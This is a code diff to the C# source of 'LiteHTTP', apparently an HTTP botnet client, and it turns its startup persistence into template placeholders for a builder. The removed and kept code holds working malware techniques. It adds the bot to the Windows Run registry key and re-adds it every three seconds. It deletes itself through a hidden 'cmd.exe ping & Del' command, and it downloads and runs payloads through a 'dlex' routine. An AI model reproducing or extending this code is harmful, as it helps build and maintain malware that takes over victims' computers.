@@ -30,7 +30,7 @@ namespace LiteHTTP
         public static string botv = "v1.0.0";
         public static string edkey = "#encryptionkey#";
         public static string ctask = "0";
-		public static string startupkey = "#startkey#";
+		#startline#
     }
 
 	class Identification
@@ -364,19 +364,12 @@ namespace LiteHTTP
             try
             {
                 dlex(url, "", false);
-                Program.s.Abort();
-                if (keyExists(Settings.startupkey))
-                {
-                    Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                    regkey.DeleteValue(Settings.startupkey);
-                }
-                System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo();
-                si.FileName = "cmd.exe";
-                si.Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del \"" + getLocation() + "\"";
-                si.CreateNoWindow = true;
-                si.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-                System.Diagnostics.Process.Start(si);
-                return true;
+                if (uninstall())
+				{
+					return true;
+				}else{
+					return false;
+				}
             }
             catch
             {
@@ -437,11 +430,7 @@ namespace LiteHTTP
             try
             {
                 Program.s.Abort();
-                if (keyExists(Settings.startupkey))
-                {
-                    Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                    regkey.DeleteValue(Settings.startupkey);
-                }
+                #startcheck#
                 System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo();
                 si.FileName = "cmd.exe";
                 si.Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del \"" + getLocation() + "\"";
@@ -778,8 +767,7 @@ namespace LiteHTTP
         {
             Thread x = new Thread(new ThreadStart(mainthread));
             x.Start();
-            s = new Thread(new ThreadStart(startthread));
-            s.Start();
+            #startthread#
         }
 
         private static void mainthread()
@@ -832,22 +820,7 @@ namespace LiteHTTP
             } while (true);
         }
 
-        private static void startthread()
-        {
-            do
-            {
-                try
-                {
-                    if (!Misc.keyExists(Settings.startupkey))
-                    {
-                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                        reg.SetValue(Settings.startupkey, "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
-                    }
-                }
-                catch { } 
-                Thread.Sleep(3000);
-            } while (true);
-        }
+        #start#
 	}
     }
 }
